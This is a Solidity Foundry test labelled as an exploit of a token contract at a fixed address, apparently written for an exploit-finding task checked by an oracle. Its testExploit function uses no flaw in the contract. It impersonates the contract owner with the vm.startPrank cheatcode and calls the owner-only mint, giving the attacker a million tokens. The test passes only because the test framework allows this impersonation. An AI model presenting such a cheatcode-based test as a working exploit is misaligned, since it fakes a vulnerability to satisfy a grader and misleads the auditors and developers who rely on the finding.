// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ILineAxis {
    function mint(address to, uint value) external;
    function balanceOf(address account) external view returns (uint256);
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF0c5831EC3Da15f3696B4DAd8B21c7Ce2f007f28;
    address attacker = address(this);
    ILineAxis internal token;
    address internal owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ILineAxis(TARGET);
        owner = token.owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Attacker should have no tokens initially
        uint256 initialBalance = token.balanceOf(attacker);
        assertEq(initialBalance, 0, "Attacker should start with 0 tokens");

        // Define a large amount of tokens to mint
        uint256 amountToMint = 1_000_000 * 1e18;

        // Impersonate the contract owner
        vm.startPrank(owner);

        // Call the mint function to create new tokens for the attacker
        token.mint(attacker, amountToMint);

        // Stop impersonating
        vm.stopPrank();

        // The oracle will check if the attacker's balance has increased
        // We can also assert this for clarity
        uint256 finalBalance = token.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker's balance should have increased");
        assertEq(finalBalance, amountToMint, "Attacker should have the minted amount");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

